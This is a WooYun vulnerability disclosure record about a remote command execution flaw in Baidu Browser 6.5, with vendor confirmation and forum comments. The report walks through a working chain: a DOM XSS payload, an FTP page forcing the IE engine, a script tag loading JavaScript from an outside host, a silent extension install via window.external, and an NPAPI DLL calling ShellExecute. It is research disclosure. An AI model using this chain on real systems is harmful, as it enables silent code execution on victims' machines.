{"id": 47642, "wybug_id": "wooyun-2014-080158", "wybug_title": "百度浏览器远程命令执行", "wybug_corp": "百度", "wybug_author": "gainover", "wybug_date": "2014-10-20 18:24", "wybug_open_date": "2015-01-18 18:26", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "浏览器漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-18：\t细节向公众公开  简要描述： 为了上google，我装了百度浏览器（版本：6.5.0.50415），然后就研究了一番。 详细说明：  1. 按照常规的测试思路，首先我们找到特权域，包括bdbrowser://, http://xapp.baidu.com/ 这2个。2. 随后我们需要在这2个特权域下找到可用的XSS，在bdbrowser域下并没有找到太明显可用的地方，然后开始找xapp.baidu.com，经过一番搜刮，找到了一个DOM XSS的点。http://xapp.baidu.com/browserextension/single/sinaweibo/auth.php#access_token=<img src=1 onerror=alert(1)>3. 然而不幸的是，这个DOM XSS会被chrome的xss auditor所拦截。\n\n4. 继续找其他XSS点也没找到， 绕XSS过滤器又绕不过，那么怎么办呢？百度浏览器是双核，而IE内核对这个DOM XSS并不会拦截，我们可以强制百度浏览器使用IE内核，从而使得这个XSS发挥作用。5. 使用了一段时间，发现浏览器加载ftp页面的时候，会强制使用IE模式。\n\n6. 而ftp协议下，也是可以访问网页的，因此我们可以使用ftp协议下的页面来嵌入该XSS页面实现效果。于是虚拟机中搭建一个匿名ftp，得到url:ftp://192.168.1.107/test/bdbrowser.htm内容如下:\n<html><iframe src=\"http://xapp.baidu.com/browserextension/single/sinaweibo/auth.php#access_token=<img src=1 onerror='var s=document.createElement(&quot;script&quot;);s.src=&quot;http://192.168.1.20/test/bdbrowser.js?&quot;+Math.random();document.body.appendChild(s);'//\"></iframe></html>\n该页面内，会调用外部JS文件 http://192.168.1.20/test/bdbrowser.js随后的利用代码，均在bdbrowser.js中写入，例如写入一句:alert(document.domain);，可以看到JS被成功执行。\n\n7. 接着，我们要做的是如何从 alert 到 实现远程命令执行。 8. 通过对external所提供的API的一番研究，我将目光集中到了插件安装上。 一个典型的插件安装请求函数为以下内容：\nwindow.external.StartRequest(222,\"AppService.AppMarket.DownloadPack\",\"(function(id,res){alert(res)})\",\"{\\\"ID\\\":\\\"pbhcaodfcnjnjnbfpagkgjncknmhelll\\\",\\\"UPDATE\\\":\\\"false\\\",\\\"URL\\\":\\\"http://dlsw.br.baidu.com/9a8fea874f8419d2281f7bb2d7cf7883.crx\\\"}\",window,\"\");\n然后会出现以下提示内容：\n\n这个“安装确认框”，显然不是我们想看到的东西。。。有办法绕过去么？9. 我猜测，数据中的Update参数的true/false是用于控制是 “更新”一个插件，还是安装一个插件，那么如果是更新一个插件，是不是就不会出现“安装”提示了呢？于是我用自己编写的chrome插件，进行了一个测试\nwindow.external.StartRequest(222,\"AppService.AppMarket.DownloadPack\",\"(function(id,res){alert(res)})\",\"{\\\"ID\\\":\\\"Silenter\\\",\\\"UPDATE\\\":\\\"true\\\",\\\"URL\\\":\\\"http://x.com/swf_collector.crx\\\"}\",window,\"\");\n其中ID为百度浏览器内置的插件ID，UPDATE被设置为true，URL被设置为我们的插件地址。可以看到，插件被成功安装。\n\n10. 到了这一步，我们已经能够实现远程安装任意插件了，接着就是利用插件来执行系统命令啦。11. 利用 npapi，简单的写了一个dll，然后利用shellexecute执行一下calc\nvoid CmdRunPluginAPI::run(const std::string& val){\tShellExecute(NULL,L\"\",L\"calc.exe\",NULL,NULL,SW_SHOW);}\n12. 接着我们将chrome插件调用这个dll，具体见chrome插件开发中npapi相关文档13. 让受害者访问一个页面，页面自动跳转到ftp页面后，插件就会被自动安装上：代码这样的：\n<script>\tlocation.href=\"ftp://192.168.1.107/test/bdbrowser.htm\";</script>\n\n\n14. 受害者随意访问一个网页， 就可以看到执行了本地的计算器：\n\n   漏洞证明：  视频：http://v.youku.com/v_show/id_XODA3NTE4NzYw.html密码： wooyuncmd   修复方案：  嗯，先修XSS，其它方面，哪些地方欠缺安全考虑的点，从上文中自行挖掘。   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-10-20 20:18 厂商回复： 感谢提交，我们已经通知业务部门处理此问题。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-20 18:25 |    \t\tif、so  \t\t\t( 核心白帽子 |\t\t\t        Rank:1008 漏洞数:91        | 梦想还是要有的，万一实现了呢？)\t\t \n  吊    \n     2014-10-20 18:27 |    \t\tAepl│恋爱 \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:15        | Forzen恋爱-不要做你的Guest 只想做的你adm...)\t\t \n  前排卖瓜子话梅    \n     2014-10-20 18:28 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  前排!~    \n     2014-10-20 18:31 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  闪电在哪里?    \n     2014-10-20 18:31 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  CCTV看这里    \n     2014-10-20 18:31 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  浏览器专场的节奏啊    \n     2014-10-20 18:39 |    \t\tki11y0u \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:23        | 好好学习，求带飞~~~~~~~~~~~~~~~~~~~~~~...)\t\t \n  mark    \n     2014-10-20 18:40 |    \t\t大孩小孩 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:7        | 哈哈哈哈)\t\t \n  mark    \n     2014-10-20 18:41 |    \t\t老笨蛋 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 老笨蛋一个)\t\t \n  留个位置先。    \n     2014-10-20 19:02 |    \t\tGHK \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 请叫我小渣渣。)\t\t \n  @ Aepl│恋爱 来两斤瓜子。    \n     2014-10-20 19:10 |    \t\t        Jn·  \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:14        | 本小菜很可爱，如果不服你TM来打我啊--哎呀...)\t\t \n  ~.~  好屌    \n     2014-10-20 19:20 |    \t\t浩森 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:6        )\t\t \n  so diao    \n     2014-10-20 19:27 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  二哥你是黑客啊    \n     2014-10-20 19:29 |    \t\t大大灰狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:248 漏洞数:53        | Newbie)\t\t \n  @p.z 我也是才知道    \n     2014-10-20 19:34 |    \t\tWoodee \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 乌云路人甲，打脸pa pa pa)\t\t \n  @大大灰狼 我也知道了    \n     2014-10-20 19:42 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  @p.z  我也是才知道，谢谢你告诉我们这个消息    \n     2014-10-20 21:20 |    \t\t威猛老爷 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:3        | 老爷，你在哪里？)\t\t \n  屌爆了    \n     2014-10-20 21:24 |    \t\t盛大网络(乌云厂商)\t\t \n  我猜是浏览器的接口出了问题    \n     2014-10-20 21:33 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  为啥你上谷歌要装百度浏览器    \n     2014-10-20 22:49 |    \t\tjeary \t\t\t( 普通白帽子  |\t\t\t        Rank:296 漏洞数:106        | (:‮.kcaH eb nac gnihtynA))\t\t \n  @px1624 因为百度新功能“海外通道”    \n     2014-10-21 00:04 |    \t\t0gucci \t\t\t( 普通白帽子  |\t\t\t        Rank:166 漏洞数:33        | 深度值得深入)\t\t \n  google 现在不用翻墙了 天朝又放它近来了，可以直接访问- -#    \n     2014-10-21 08:34 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  脚印    \n     2014-10-21 09:35 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  uxss?    \n     2014-10-21 13:04 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  一看你就是黑客    \n     2014-10-21 15:26 |    \t\t徽弘 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:5        )\t\t \n  看到标题我就进来了    \n     2014-10-21 17:13 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  一看是二哥发的洞就果断进来了    \n     2014-10-22 23:45 |    \t\tnoob \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:18        | 向各位大神学习，向各位大神致敬)\t\t \n  @0gucci 为毛我打不开    \n     2014-10-23 11:37 |    \t\t0gucci \t\t\t( 普通白帽子  |\t\t\t        Rank:166 漏洞数:33        | 深度值得深入)\t\t \n  @noob .hk?    \n     2014-10-24 10:15 |    \t\tnoob \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:18        | 向各位大神学习，向各位大神致敬)\t\t \n  @0gucci 不管是.hk还是.com都不行，必须翻墙    \n     2015-01-18 20:56 |    \t\tjeary \t\t\t( 普通白帽子  |\t\t\t        Rank:296 漏洞数:106        | (:‮.kcaH eb nac gnihtynA))\t\t \n  公开了~从DOM XSS到命令执行   求科普特权域怎么找    \n     2015-01-19 13:30 |    \t\t木马游民 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:8        | I love LSD!)\t\t \n  楼主是黑客    \n     2015-01-20 00:51 |    \t\tdarkkid \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:19        | ###)\t\t \n  X-UA-Compatible可以使用兼容模式，也就是IE的。不过不知道百度浏览器是否支持这个标准    \n     2015-01-23 13:13 |    \t\tLaiX \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:39        | 承接 建站、仿站、维护、反黑客、代码审计...)\t\t \n  二哥，为何这么吊    \n     2015-01-26 19:11 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n      \n     2015-01-28 14:38 |    \t\t盛大网络(乌云厂商)\t\t \n  2015年开始Chrome中断使用NPAPI插件    \n     2015-04-26 15:18 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  可怕    \n     2015-07-01 17:53 |    \t\t黑色雨滴 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 没有主页新手一个前来玩玩)\t\t \n  好犀利。。。    \n     2015-07-22 21:39 |    \t\tDrizzle.Risk \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:19        | You have an error in your SQL syntax; ch...)\t\t \n  很不错啊~    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}